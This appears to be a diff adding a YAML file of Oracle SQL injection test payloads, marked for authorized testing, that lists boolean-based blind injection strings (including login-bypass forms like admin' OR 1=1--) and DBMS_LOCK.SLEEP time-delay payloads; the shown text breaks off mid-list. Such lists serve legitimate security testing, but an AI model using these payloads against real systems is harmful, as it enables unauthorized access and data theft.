@@ -1,0 +1,49 @@
+# Oracle Database SQL Injection Test Payloads
+# AUTHORIZED TESTING ONLY
+# Database: Oracle 11g - 21c
+# Last Updated: 2024
+
+# ==============================================================================
+# BOOLEAN-BASED BLIND SQL INJECTION
+# ==============================================================================
+
+# TRUE Condition Payloads
+boolean_true_payload: "' OR '1'='1'--"
+
+# Alternative TRUE conditions
+boolean_true_alternatives:
+  - "' OR 1=1--"
+  - "' OR 'a'='a'--"
+  - "') OR ('1'='1"
+  - "')) OR (('1'='1"
+  - "1' OR '1'='1"
+  - "admin' OR 1=1--"
+  - "' OR 1=1 /*"
+  - "' OR 1=1 AND ROWNUM=1--"
+  - "admin' OR 'x'='x'--"
+  - "1 OR 1=1"
+  - "') OR 1=1--"
+  - "' OR NULL IS NULL--"
+
+# FALSE Condition Payloads
+boolean_false_payload: "' OR '1'='2'--"
+
+# Alternative FALSE conditions
+boolean_false_alternatives:
+  - "' OR 1=2--"
+  - "' OR 'a'='b'--"
+  - "') OR ('1'='2"
+  - "' OR 0=1--"
+  - "1 OR 1=2"
+  - "' OR NULL IS NOT NULL--"
+
+# ==============================================================================
+# TIME-BASED BLIND SQL INJECTION
+# ==============================================================================
+
+# Primary time delay payload (3 second delay)
+time_delay_payload: "' OR DBMS_LOCK.SLEEP(3)--"
+
+# Alternative time-based payloads
+time_delay_alternatives:
+  - "' AND DBMS_LOCK.SLEEP(3)--
